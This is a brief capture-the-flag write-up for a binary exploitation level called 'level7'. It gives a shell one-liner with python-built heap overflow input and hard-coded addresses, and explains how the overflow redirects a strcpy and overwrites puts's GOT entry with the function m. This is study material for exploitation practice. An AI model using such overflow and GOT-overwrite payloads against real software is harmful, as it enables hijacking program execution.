```shell
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Ok, so weird one. We can overflow the allocated buffer by malloc to write inside of `eax` registry which will be used as the first argument of the second `strcpy` call. We can use a GOT exploit to overwrite `puts`'s address by `m`'s.
